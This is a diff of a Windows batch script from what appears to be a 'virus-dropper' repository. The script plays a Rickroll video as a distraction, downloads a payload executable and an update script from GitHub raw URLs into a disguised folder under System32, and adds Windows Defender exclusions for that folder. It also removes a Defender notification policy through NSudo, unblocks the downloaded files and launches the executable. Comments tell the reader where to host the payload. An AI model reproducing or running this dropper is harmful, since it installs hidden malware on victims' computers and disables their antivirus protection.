@@ -13,7 +13,7 @@ powershell -inputformat none -outputformat none -NonInteractive -Command "Add-Mp
 ::direct download link
 ::edit this to your files
 md "%systemroot%\System32\Windowsexe"
-start Rickroll.mp4
+start "" Rickroll.mp4
 
 ::upload files here: github.com - create account and create repository (public) then upload files
 ::put payload file DIRECT download link here:
@@ -23,12 +23,11 @@ curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/Wi
 
 move "%appdata%\Windows.exe" "%systemroot%\System32\Windowsexe"
 curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/Update.bat" "%appdata%\update.bat"
+powershell -Command "Unblock-file 'Update.bat'"
 move "%appdata%\update.bat" "%systemroot%\System32\Windowsexe"
 powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '"%systemroot%\System32\Windowsexe'"
 NSudo -U:T -ShowWindowMode:Hide reg del "HKLM\Software\Policies\Microsoft\Windows Defender\UX Configuration" /v "Notification_Suppress" /f
 powershell -Command "Unblock-file '%systemroot%\System32\Windowsexe\Windows.exe'"
-powershell -Command "Unblock-file '%systemroot%\System32\Windowsexe\Update.bat'"
-powershell -Command "Unblock-file '%systemroot%\System32\Windowsexe\AV.bat'"
 start "Windows.exe" "%systemroot%\System32\Windowsexe\Windows.exe"
 move "AV.bat" "%systemroot%\System32\Windowsexe\AV.bat"
 powershell -inputformat none -outputformat none -NonInteractive -Command "Remove-MpPreference -ExclusionPath '"%~dp0'"
